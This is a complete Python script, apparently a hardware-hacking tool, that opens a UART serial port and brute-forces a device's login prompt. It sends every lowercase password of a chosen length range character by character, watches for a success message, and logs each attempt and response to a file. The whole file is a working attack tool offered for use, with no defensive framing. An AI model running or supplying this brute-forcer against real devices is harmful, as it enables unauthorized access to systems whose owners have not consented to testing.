#!/usr/bin/env python3
import serial
import time
import string
import sys
import re
import logging
from itertools import product

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

class UARTBruteforcer:
    def __init__(self, port='/dev/serial0', baud=115200):
        self.port = port
        self.baud = baud
        self.ser = None
        self.attempts = 0
        self.start_time = None
        self.results_file = None
        self.logger = logging.getLogger(__name__)

    def strip_ansi_escape_sequences(self, text):
        """Remove ANSI escape sequences from text"""
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    def connect(self):
        try:
            self.ser = serial.Serial(
                port=self.port,
                baudrate=self.baud,
                timeout=1.0
            )
            self.logger.info(f"Connected to {self.port}")
            return True
        except Exception as e:
            self.logger.error(f"Connection error: {e}")
            return False

    def disconnect(self):
        if self.ser and self.ser.is_open:
            self.ser.close()
            self.logger.info("Disconnected")
        if self.results_file:
            self.results_file.close()

    def init_results_file(self, filename="bruteforce_results.txt"):
        try:
            self.results_file = open(filename, 'w')
            self.results_file.write("UART Bruteforce Results\n")
            self.results_file.write("======================\n\n")
            self.results_file.write(f"Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            self.results_file.flush()
            self.logger.info(f"Results will be saved to {filename}")
        except Exception as e:
            self.logger.error(f"Error creating results file: {e}")
            self.results_file = None

    def log_result(self, test, response):
        if self.results_file:
            try:
                # Strip ANSI codes from response
                clean_response = self.strip_ansi_escape_sequences(response)
                
                # Split into lines and clean each line
                lines = clean_response.split('\n')
                cleaned_lines = []
                for line in lines:
                    # Remove carriage returns and extra spaces
                    line = line.replace('\r', '').strip()
                    if line:  # Only keep non-empty lines
                        cleaned_lines.append(line)
                
                # Join lines with newlines
                clean_response = '\n'.join(cleaned_lines)
                
                # Always log the attempt and response
                self.results_file.write(f"Attempt {self.attempts}: {test}\n")
                self.results_file.write(f"Response:\n{clean_response}\n")
                self.results_file.write("-" * 50 + "\n")
                self.results_file.flush()
                
                # Also print to console for immediate feedback
                self.logger.debug(f"Response for {test}:")
                self.logger.debug(clean_response)
            except Exception as e:
                self.logger.error(f"Error writing to results file: {e}")

    def send_password(self, password):
        if not self.ser:
            return None
        try:
            # Clear buffers
            self.ser.reset_input_buffer()
            self.ser.reset_output_buffer()
            time.sleep(0.05)  # Reduced from 0.1
            
            # Send newline to get prompt
            self.ser.write(b'\n')
            time.sleep(0.2)  # Reduced from 0.3
            
            # Clear any response from the newline
            self.ser.reset_input_buffer()
            time.sleep(0.05)  # Reduced from 0.1
            
            # Send password character by character
            for char in password:
                self.ser.write(char.encode())
                time.sleep(0.03)  # Reduced from 0.05
            
            # Send newline to complete password
            self.ser.write(b'\n')
            
            # Wait for response
            time.sleep(0.2)  # Reduced from 0.3
            
            # Read response
            response = ""
            start_time = time.time()
            last_char_time = time.time()
            
            while time.time() - start_time < 0.8:  # Reduced from 1.0
                if self.ser.in_waiting:
                    try:
                        # Read all available data
                        data = self.ser.read(self.ser.in_waiting).decode()
                        response += data
                        last_char_time = time.time()
                        
                        # If we see a complete error message, we can stop
                        if "Invalid password. Please try again." in response:
                            break
                    except UnicodeDecodeError:
                        continue
                else:
                    # If no data for 0.2 seconds, assume response is complete
                    if time.time() - last_char_time > 0.2:  # Reduced from 0.3
                        break
                time.sleep(0.05)  # Reduced from 0.1
            
            self.attempts += 1
            return response  # Keep all whitespace and newlines
        except Exception as e:
            self.logger.error(f"Error sending password: {e}")
            return None

    def bruteforce(self, min_length=1, max_length=6):
        self.logger.info("Starting bruteforce attack...")
        self.start_time = time.time()
        
        # Calculate total combinations
        total_combinations = sum(len(string.ascii_lowercase) ** length for length in range(min_length, max_length + 1))
        self.logger.info(f"Total combinations to try: {total_combinations:,}")
        
        # Try all lowercase combinations
        for length in range(min_length, max_length + 1):
            self.logger.info(f"Trying {length} character combinations...")
            for combo in product(string.ascii_lowercase, repeat=length):
                test = ''.join(combo)
                # Skip until we reach 'cya'
                # if test < 'cxa':
                #     continue
                    
                response = self.send_password(test)
                
                if response is None:
                    self.logger.warning("No response received, retrying...")
                    time.sleep(1)
                    continue
                
                # Log the attempt
                self.log_result(test, response)
                
                # Calculate timing statistics
                elapsed = time.time() - self.start_time
                rate = self.attempts / elapsed if elapsed > 0 else 0
                
                # Calculate estimated time for full perimeter
                remaining_combinations = total_combinations - self.attempts
                estimated_time_remaining = remaining_combinations / rate if rate > 0 else 0
                
                # Format time strings
                elapsed_str = self.format_time(elapsed)
                remaining_str = self.format_time(estimated_time_remaining)
                
                # Display progress
                print(f"\r[*] Current: {test} | Rate: {rate:.1f} p/s | Attempts: {self.attempts:,} | Elapsed: {elapsed_str} | Remaining: {remaining_str}", end="", flush=True)
                
                # Check for success
                clean_response = self.strip_ansi_escape_sequences(response)
                if "successful" in clean_response.lower():
                    elapsed = time.time() - self.start_time
                    success_msg = (f"\n[+] Password found: {test}\n"
                                 f"[+] Attempts: {self.attempts:,}\n"
                                 f"[+] Time taken: {self.format_time(elapsed)}\n"
                                 f"[+] Average rate: {self.attempts/elapsed:.1f} passwords/second")
                    self.logger.info(success_msg)
                    if self.results_file:
                        self.results_file.write(f"\n{success_msg}\n")
                        self.results_file.flush()
                    return test

    def format_time(self, seconds):
        """Format seconds into a human-readable time string"""
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            minutes = seconds / 60
            return f"{minutes:.1f}m"
        elif seconds < 86400:
            hours = seconds / 3600
            return f"{hours:.1f}h"
        else:
            days = seconds / 86400
            return f"{days:.1f}d"

    def finalize_results(self):
        if self.results_file:
            try:
                elapsed = time.time() - self.start_time
                self.results_file.write(f"\nFinal Statistics:\n")
                self.results_file.write(f"Total attempts: {self.attempts}\n")
                self.results_file.write(f"Total time: {elapsed:.1f} seconds\n")
                self.results_file.write(f"End time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                self.results_file.flush()
            except Exception as e:
                self.logger.error(f"Error finalizing results file: {e}")

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 4:
        print("Usage: python3 bruteforce_login.py <serial_port> [min_length] [max_length]")
        print("Example: python3 bruteforce_login.py /dev/serial0 3 5")
        sys.exit(1)

    port = sys.argv[1]
    min_length = int(sys.argv[2]) if len(sys.argv) >= 3 else 3
    max_length = int(sys.argv[3]) if len(sys.argv) == 4 else 3
    
    if min_length > max_length:
        print("[-] Error: min_length cannot be greater than max_length")
        sys.exit(1)
    
    print(f"[*] Using password length range: {min_length}-{max_length}")
    
    bruteforcer = UARTBruteforcer(port=port)

    if not bruteforcer.connect():
        sys.exit(1)

    try:
        # Initialize results file
        bruteforcer.init_results_file()
        
        # Start bruteforce attack
        password = bruteforcer.bruteforce(min_length=min_length, max_length=max_length)
        
        # Finalize results
        bruteforcer.finalize_results()

    except KeyboardInterrupt:
        print("\n[!] Bruteforce interrupted by user")
        bruteforcer.finalize_results()
    finally:
        bruteforcer.disconnect()

if __name__ == "__main__":
    main() 